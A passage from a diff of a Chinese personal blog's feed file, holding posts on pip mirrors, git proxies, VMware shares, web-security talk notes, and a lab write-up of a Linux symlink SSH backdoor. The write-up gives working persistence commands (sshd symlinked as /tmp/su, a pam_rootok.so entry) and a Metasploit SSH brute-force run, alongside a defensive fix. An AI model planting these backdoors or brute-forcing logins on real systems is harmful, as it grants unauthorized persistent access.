rel="noopener">https://github.com/5alt/ctf-challenges/blob/master/0ctf2016-qual/web500_guestbook/html/show.php</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var debug=false;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>统一资源标识符</p><h4 id="scheme"><a href="#scheme" class="headerlink" title="scheme"></a>scheme</h4><p>http,https,ftp</p><p>file,gopher,</p><h4 id="Electron-远程命令执行漏洞"><a href="#Electron-远程命令执行漏洞" class="headerlink" title="Electron 远程命令执行漏洞"></a>Electron 远程命令执行漏洞</h4><p>基于electron构建的app登记了协议,即可以使用该协议直接打开应用程序</p><p>打开恶意页面就能被入侵</p><p>2016年hitb 荷兰安全会议</p><h4 id="认证部分"><a href="#认证部分" class="headerlink" title="认证部分"></a>认证部分</h4><p>用于</p><p><a href="https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit</a></p><h3 id="host-1"><a href="#host-1" class="headerlink" title="host"></a>host</h3><p>浏览器自动修正</p><ul><li>5alt. me -&gt; 5alt.me</li><li>CRLF (DNS解析错误)</li></ul><p>判断绕过</p><ul><li>url.startswith(“<a href="http://www.qq.com&quot;" target="_blank" rel="noopener">http://www.qq.com&quot;</a>)</li><li>指向内网ip</li></ul><p>DNS Reind</p><p>homeograph attack</p><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>用http请求其他端口</p><ul><li>redis(容错机制)</li></ul><p>一些限制绕过</p><ul><li>火狐下crlf -&gt; xss</li></ul><h4 id="path"><a href="#path" class="headerlink" title="path"></a>path</h4><ul><li><a href="http://127.0.0.1/http/path.php?x=x" target="_blank" rel="noopener">http://127.0.0.1/http/path.php?x=x</a></li></ul><p>Ngix解析漏洞,剖析</p><p>1.jpg/1.php</p><p>原因</p><p>去年航电 hctf 出题</p><h3 id="query"><a href="#query" class="headerlink" title="query"></a>query</h3><p>urlencode</p><h4 id="Fregment"><a href="#Fregment" class="headerlink" title="Fregment"></a>Fregment</h4><p>浏览器中的Fregment 不会发生到服务器</p><p>XSS</p><h3 id="url-parser"><a href="#url-parser" class="headerlink" title="url parser"></a>url parser</h3><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>HTTP 是Web安全的基础</li><li>常见的点也会存在安全问题</li><li>搞安全要懂开发</li><li>多读文档</li><li>对问题深入探索原因</li></ul><p>渗透测试,周期短,目标是拿到shell,各种不同方式,渗透测试以目标为导向,安全研究以研究为导向,提出新的攻击方法,带动行业发展,安全研究偏向学术圈,渗透测试偏向工业圈,渗透测试不需要了解原理,安全研究需要关注动态</p><p>渗透测试的强度,和流程熟练度</p><p>找到合适自己的方法论,开发出自己的一套工具,或者是找到合适的工具</p><p>安全研究,是关注面更广,更注意细节</p><p>两者不存在壁垒</p>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;默认的pip源太慢，换成国内源会快很多&lt;/p&gt;
+      &lt;p&gt;一些http知识&lt;/p&gt;
     
     </summary>
     
-      <category term="编程" scheme="https://alem0n.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
+      <category term="网络" scheme="https://alem0n.github.io/categories/%E7%BD%91%E7%BB%9C/"/>
     
     
-      <category term="Python" scheme="https://alem0n.github.io/tags/Python/"/>
+      <category term="CTF" scheme="https://alem0n.github.io/tags/CTF/"/>
+    
+      <category term="网络" scheme="https://alem0n.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
     
   </entry>
   
@@ -334,26 +264,96 @@
   </entry>
   
   <entry>
-    <title>vmware 设置共享目录</title>
-    <link href="https://alem0n.github.io/2018/11/09/vmware_%E8%AE%BE%E7%BD%AE%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95-2018/"/>
-    <id>https://alem0n.github.io/2018/11/09/vmware_设置共享目录-2018/</id>
-    <published>2018-11-09T02:00:00.000Z</published>
-    <updated>2019-05-21T03:34:42.228Z</updated>
+    <title>Python更换pip源</title>
+    <link href="https://alem0n.github.io/2019/02/27/Python%E6%9B%B4%E6%8D%A2pip%E6%BA%90-2019/"/>
+    <id>https://alem0n.github.io/2019/02/27/Python更换pip源-2019/</id>
+    <published>2019-02-27T12:00:00.000Z</published>
+    <updated>2019-05-21T03:34:42.235Z</updated>
     
-    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>vm-tools有时候不好用，用vm做一个共享目录可以解决无法拖动文件的问题</p><a id="more"></a><h3 id="安装-Vmware-Tools"><a href="#安装-Vmware-Tools" class="headerlink" title="安装 Vmware-Tools"></a>安装 Vmware-Tools</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# apt-get install open-vm-tools-desktop fuse</span><br><span class="line">vmware 命令</span><br><span class="line">root@kali:~# vmware-</span><br><span class="line">     vmware-checkvm             vmware-uninstall-tools.pl</span><br><span class="line">     vmware-config-tools.pl     vmware-user-suid-wrapper</span><br><span class="line">     vmware-guestproxycerttool  vmware-vgauth-cmd</span><br><span class="line">     vmware-hgfsclient          vmware-vgauth-smoketest</span><br><span class="line">     vmware-namespace-cmd       vmware-vmblock-fuse</span><br><span class="line">     vmware-rpctool</span><br></pre></td></tr></table></figure><h3 id="查看共享目录命令"><a href="#查看共享目录命令" class="headerlink" title="查看共享目录命令"></a>查看共享目录命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# vmware-hgfsclient</span><br></pre></td></tr></table></figure><h3 id="新建目录"><a href="#新建目录" class="headerlink" title="新建目录"></a>新建目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# mkdir /mnt/hgfs/ShareDir/</span><br></pre></td></tr></table></figure><h3 id="创建共享目录"><a href="#创建共享目录" class="headerlink" title="创建共享目录"></a>创建共享目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# /usr/bin/vmhgfs-fuse .host:/ /mnt/ -o subtype=vmhgfs-fuse,allow_other</span><br><span class="line">root@kali:~# vmware-hgfsclient</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-vmware_设置共享目录-2018/clip_image002.gif" alt="clipboard.png"></p>]]></content>
+    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>默认的pip源太慢，换成国内源会快很多</p> <a id="more"></a><p>Python更换pip源</p><p>对于Python开发用户来讲，PIP安装软件包是家常便饭。但国外的源下载速度实在太慢，浪费时间。而且经常出现下载后安装出错问题。所以把PIP安装源替换成国内镜像，可以大幅提升下载速度，还可以提高安装成功率。</p><p><strong>国内源：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">新版ubuntu要求使用https源，要注意。</span><br><span class="line"></span><br><span class="line">清华：https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line">阿里云：http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class="line"></span><br><span class="line">华中理工大学：http://pypi.hustunique.com/</span><br><span class="line"></span><br><span class="line">山东理工大学：http://pypi.sdutlinux.org/ </span><br><span class="line"></span><br><span class="line">豆瓣：http://pypi.douban.com/simple/</span><br></pre></td></tr></table></figure><p><strong>临时使用：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以在使用pip的时候加参数-i http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">例如：pip install -i http://mirrors.aliyun.com/pypi/simple/ pyspider，这样就会从清华这边的镜像去安装pyspider库。</span><br></pre></td></tr></table></figure><p><strong>永久修改，一劳永逸：</strong></p><p>Linux下，修改 <code>~/.pip/pip.conf</code> (没有就创建一个文件夹及文件。文件夹要加“.”，表示是隐藏文件夹)</p><p>内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line">[install] trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure><p>windows下，直接在<code>user</code>目录中创建一个pip目录，如：<code>C:\Users\xx\pip</code>，新建文件<code>pip.ini</code>。内容同上。</p><p><strong>一、新建 pip 配置文件夹</strong></p><p>先在 windows “文件资源管理器” 地址栏 输入 <code>%APPDATA%</code> 按回车，打开程序自定义设置文件夹</p><p>然后，创建名为 <code>pip</code>  的文件夹，用于存放 <code>pip</code> 配置文件</p><p><img src="/images/2019-03-02-Python更换pip源-2019/clip_image002.jpg" alt="e_pip_folder.png"></p><p><strong>二、新建 pip 配置文件</strong></p><p>在刚才创建好的 <code>pip</code> 文件夹中，新建 名为 <code>pip.ini</code> 的配置文件</p><p><img src="/images/2019-03-02-Python更换pip源-2019/clip_image004.jpg" alt="pip_ini.png"></p><p><strong>三、设置 pip 国内源 (使用 阿里云 国内镜像)</strong></p><p>在 <code>pip.ini</code> 文件中输入以下内容，然后保存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url=http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line"></span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure><p><img src="/images/2019-03-02-Python更换pip源-2019/clip_image006.gif" alt="clipboard.png"></p><p><strong>四、验证设置</strong></p><p>按 windows 徽标+ R，输入 cmd，按回车，调出 windows 命令行窗口</p><p><img src="/images/2019-03-02-Python更换pip源-2019/clip_image008.jpg" alt="windows_cmd.png"></p><p>尝试用 pip 安装一个比较大一点的包，譬如 kivy.deps.gstreamer (约 120 M)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install kivy.deps.gstreamer</span><br></pre></td></tr></table></figure><p>注意到 pip 从阿里云 (aliyun) 下载，速度达到了每秒 7.5 M，快到飞起来</p><p><img src="/images/2019-03-02-Python更换pip源-2019/clip_image010.jpg" alt="liyun_mirror.png"></p>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;vm-tools有时候不好用，用vm做一个共享目录可以解决无法拖动文件的问题&lt;/p&gt;
+      &lt;p&gt;默认的pip源太慢，换成国内源会快很多&lt;/p&gt;
     
     </summary>
     
-      <category term="VMware使用" scheme="https://alem0n.github.io/categories/VMware%E4%BD%BF%E7%94%A8/"/>
+      <category term="编程" scheme="https://alem0n.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="Python" scheme="https://alem0n.github.io/tags/Python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Next主题标签页标签随机颜色的设置方法</title>
+    <link href="https://alem0n.github.io/2019/02/27/Next%E4%B8%BB%E9%A2%98%E6%A0%87%E7%AD%BE%E9%A1%B5%E6%A0%87%E7%AD%BE%E9%9A%8F%E6%9C%BA%E9%A2%9C%E8%89%B2%E7%9A%84%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95-2019/"/>
+    <id>https://alem0n.github.io/2019/02/27/Next主题标签页标签随机颜色的设置方法-2019/</id>
+    <published>2019-02-27T12:00:00.000Z</published>
+    <updated>2019-05-21T03:34:42.235Z</updated>
+    
+    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>网上找了很久的办法，存下来</p><a id="more"></a><p>只需在<code>\themes\next\layout\page.swig</code>中的这一段中间</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tag-cloud-tags"</span>&gt;</span></span><br><span class="line">  &#123;&#123; tagcloud(&#123;min_font: 12, max_font: 30, amount: 200, color: true, start_color: '#ccc', end_color: '#111'&#125;) &#125;&#125;</span><br><span class="line">  ————————————————————插入代码位置——————————————————————————</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>加上如下代码就可以了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">  <span class="keyword">var</span> list = <span class="built_in">document</span>.querySelectorAll(<span class="string">'.tag-cloud-tags a'</span>);</span><br><span class="line">  <span class="built_in">Array</span>.prototype.forEach.call(list, (item, index) =&gt; &#123;</span><br><span class="line">    item.style.fontSize = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">29</span> + <span class="number">12</span>) + <span class="string">'px'</span>;<span class="comment">//12 ~ 40</span></span><br><span class="line">    item.style.color = <span class="string">'rgb('</span> + <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">201</span>) + <span class="string">', '</span> + <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">201</span>) + <span class="string">', '</span> + <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">201</span>) + <span class="string">')'</span>;<span class="comment">// 0,0,0 -&gt; 200,200,200</span></span><br><span class="line">  &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>Ps:</p><p>​    min_font和max_font代表最大最小文字，可以自行更改</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;网上找了很久的办法，存下来&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="生活" scheme="https://alem0n.github.io/categories/%E7%94%9F%E6%B4%BB/"/>
+    
+    
+      <category term="生活" scheme="https://alem0n.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
+    
+      <category term="Hexo" scheme="https://alem0n.github.io/tags/Hexo/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>设置github代理</title>
+    <link href="https://alem0n.github.io/2019/02/27/%E8%AE%BE%E7%BD%AEgithub%E4%BB%A3%E7%90%86-2019/"/>
+    <id>https://alem0n.github.io/2019/02/27/设置github代理-2019/</id>
+    <published>2019-02-27T12:00:00.000Z</published>
+    <updated>2019-05-21T03:34:42.237Z</updated>
+    
+    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>git下设置网络代理</p><a id="more"></a><h3 id="设置http、https代理"><a href="#设置http、https代理" class="headerlink" title="设置http、https代理"></a>设置http、https代理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy &apos;http://127.0.0.1:1080&apos;</span><br><span class="line">git config --global https.proxy &apos;https://127.0.0.1:1080&apos;</span><br><span class="line">走socks5</span><br><span class="line">git config --global http.proxy &apos;socks5://127.0.0.1:1080&apos;</span><br><span class="line">git config --global https.proxy &apos;socks5://127.0.0.1:1080&apos;</span><br></pre></td></tr></table></figure><p>取消</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;git下设置网络代理&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="生活" scheme="https://alem0n.github.io/categories/%E7%94%9F%E6%B4%BB/"/>
+    
+    
+      <category term="生活" scheme="https://alem0n.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
+    
+      <category term="GitHub" scheme="https://alem0n.github.io/tags/GitHub/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux软连接后门</title>
+    <link href="https://alem0n.github.io/2018/11/09/Linux%E8%BD%AF%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8-2018/"/>
+    <id>https://alem0n.github.io/2018/11/09/Linux软连接后门-2018/</id>
+    <published>2018-11-09T02:00:00.000Z</published>
+    <updated>2019-05-21T03:34:42.227Z</updated>
+    
+    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>记录一次Linux软连接后门实验过程，ctf攻防中可用做维持</p><a id="more"></a><h3 id="一、实验过程："><a href="#一、实验过程：" class="headerlink" title="一、实验过程："></a>一、实验过程：</h3><h5 id="1、在靶机执行并查看是否软连接建立完成："><a href="#1、在靶机执行并查看是否软连接建立完成：" class="headerlink" title="1、在靶机执行并查看是否软连接建立完成："></a>1、在靶机执行并查看是否软连接建立完成：</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span><br><span class="line">netstat -tunlp | grep 12345</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh1.png" alt="ssh后门1"></p><h5 id="2、在攻击机利用ssh并使用任意密码登陆靶机"><a href="#2、在攻击机利用ssh并使用任意密码登陆靶机" class="headerlink" title="2、在攻击机利用ssh并使用任意密码登陆靶机"></a>2、在攻击机利用ssh并使用任意密码登陆靶机</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.86.135 -p 12345</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh10.png" alt="ssh后门2"></p><h5 id="3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录"><a href="#3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录" class="headerlink" title="3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录"></a>3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录</h5><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh11.png" alt="ssh后门3"></p><h3 id="二、防范"><a href="#二、防范" class="headerlink" title="二、防范"></a>二、防范</h3><h5 id="1、修改配置文件"><a href="#1、修改配置文件" class="headerlink" title="1、修改配置文件"></a>1、修改配置文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">UsePAM no</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh12.png" alt="ssh后门4"></p><h5 id="2、重载ssh配置文件"><a href="#2、重载ssh配置文件" class="headerlink" title="2、重载ssh配置文件"></a>2、重载ssh配置文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/sshd reload</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh13.png" alt="ssh后门5"></p><h5 id="3、验证，使用任意密码无法登陆，使用正确密码可以登录"><a href="#3、验证，使用任意密码无法登陆，使用正确密码可以登录" class="headerlink" title="3、验证，使用任意密码无法登陆，使用正确密码可以登录"></a>3、验证，使用任意密码无法登陆，使用正确密码可以登录</h5><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh14.png" alt="ssh后门6"></p><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh15.png" alt="ssh后门7"></p><h3 id="三、延伸"><a href="#三、延伸" class="headerlink" title="三、延伸"></a>三、延伸</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此类ssh后门的核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能,默认的配置文件中出来su，是否还有其他的可利用的配置文件</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">echo "auth sufficient pam_rootok.so" &gt;&gt; /etc/pam.d/hacker</span><br><span class="line">cat /etc/pam.d/hacker</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=2333</span><br><span class="line">netstat  -tunlp | grep 2333</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh16.png" alt="ssh后门8"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-Linux软连接后门-2018/ssh17.png" alt="ssh后门9"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">实践表明通过软连接文件名指定ssh的pam配置文件为hacker,只要文件中包含&quot;auth sufficient pam_rootok.so&quot;即可无密码登陆</span><br><span class="line"></span><br><span class="line">最后在etc/pam.d/目录下查找包含pam_rootok.so配置的文件</span><br></pre></td></tr></table></figure><h3 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h3><h5 id="1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用"><a href="#1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用" class="headerlink" title="1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用"></a><code>1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用</code></h5><h5 id="2、如果被控主机不允许root登陆可用其他已存在用户登陆"><a href="#2、如果被控主机不允许root登陆可用其他已存在用户登陆" class="headerlink" title="2、如果被控主机不允许root登陆可用其他已存在用户登陆"></a><code>2、如果被控主机不允许root登陆可用其他已存在用户登陆</code></h5><h5 id="3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：-tmp-su-home-su）在-etc-pam-d-目录下寻找对应的PAM配置文件-如：-etc-pam-d-su"><a href="#3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：-tmp-su-home-su）在-etc-pam-d-目录下寻找对应的PAM配置文件-如：-etc-pam-d-su" class="headerlink" title="3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)"></a><code>3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)</code></h5><h5 id="4、任意密码登陆的核心是auth-sufficient-pam-rootok-so-只要PAM配置文件中包含此配置即可-SSH任意密码登陆"><a href="#4、任意密码登陆的核心是auth-sufficient-pam-rootok-so-只要PAM配置文件中包含此配置即可-SSH任意密码登陆" class="headerlink" title="4、任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆"></a><code>4、任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆</code></h5><h3 id="五、msf相应ssh登陆模块"><a href="#五、msf相应ssh登陆模块" class="headerlink" title="五、msf相应ssh登陆模块"></a>五、msf相应ssh登陆模块</h3><h4 id="1、批量ssh登录：用msf的ssh登录模块"><a href="#1、批量ssh登录：用msf的ssh登录模块" class="headerlink" title="1、批量ssh登录：用msf的ssh登录模块"></a>1、批量ssh登录：用msf的ssh登录模块</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.10-100.1</span><br><span class="line"></span><br><span class="line">set username root</span><br><span class="line"></span><br><span class="line">set password 123456</span><br><span class="line"></span><br><span class="line">run/exploit</span><br><span class="line"></span><br><span class="line">sessions  // 查看成功登录的会话，</span><br><span class="line"></span><br><span class="line">sessions  -i // 打开某个会话</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;记录一次Linux软连接后门实验过程，ctf攻防中可用做维持&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="https://alem0n.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
     
       <category term="Linux" scheme="https://alem0n.github.io/tags/Linux/"/>
     
-      <category term="VMware" scheme="https://alem0n.github.io/tags/VMware/"/>
+      <category term="渗透测试" scheme="https://alem0n.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
@@ -409,6 +409,30 @@
   </entry>
   
   <entry>
+    <title>vmware 设置共享目录</title>
+    <link href="https://alem0n.github.io/2018/11/09/vmware_%E8%AE%BE%E7%BD%AE%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95-2018/"/>
+    <id>https://alem0n.github.io/2018/11/09/vmware_设置共享目录-2018/</id>
+    <published>2018-11-09T02:00:00.000Z</published>
+    <updated>2019-05-21T03:34:42.228Z</updated>
+    
+    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>vm-tools有时候不好用，用vm做一个共享目录可以解决无法拖动文件的问题</p><a id="more"></a><h3 id="安装-Vmware-Tools"><a href="#安装-Vmware-Tools" class="headerlink" title="安装 Vmware-Tools"></a>安装 Vmware-Tools</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# apt-get install open-vm-tools-desktop fuse</span><br><span class="line">vmware 命令</span><br><span class="line">root@kali:~# vmware-</span><br><span class="line">     vmware-checkvm             vmware-uninstall-tools.pl</span><br><span class="line">     vmware-config-tools.pl     vmware-user-suid-wrapper</span><br><span class="line">     vmware-guestproxycerttool  vmware-vgauth-cmd</span><br><span class="line">     vmware-hgfsclient          vmware-vgauth-smoketest</span><br><span class="line">     vmware-namespace-cmd       vmware-vmblock-fuse</span><br><span class="line">     vmware-rpctool</span><br></pre></td></tr></table></figure><h3 id="查看共享目录命令"><a href="#查看共享目录命令" class="headerlink" title="查看共享目录命令"></a>查看共享目录命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# vmware-hgfsclient</span><br></pre></td></tr></table></figure><h3 id="新建目录"><a href="#新建目录" class="headerlink" title="新建目录"></a>新建目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# mkdir /mnt/hgfs/ShareDir/</span><br></pre></td></tr></table></figure><h3 id="创建共享目录"><a href="#创建共享目录" class="headerlink" title="创建共享目录"></a>创建共享目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# /usr/bin/vmhgfs-fuse .host:/ /mnt/ -o subtype=vmhgfs-fuse,allow_other</span><br><span class="line">root@kali:~# vmware-hgfsclient</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-09-vmware_设置共享目录-2018/clip_image002.gif" alt="clipboard.png"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;vm-tools有时候不好用，用vm做一个共享目录可以解决无法拖动文件的问题&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="VMware使用" scheme="https://alem0n.github.io/categories/VMware%E4%BD%BF%E7%94%A8/"/>
+    
+    
+      <category term="Linux" scheme="https://alem0n.github.io/tags/Linux/"/>
+    
+      <category term="VMware" scheme="https://alem0n.github.io/tags/VMware/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Hello World, Hello Blog</title>
     <link href="https://alem0n.github.io/2018/11/09/hello-2018/"/>
     <id>https://alem0n.github.io/2018/11/09/hello-2018/</id>
@@ -433,30 +457,6 @@
     
     
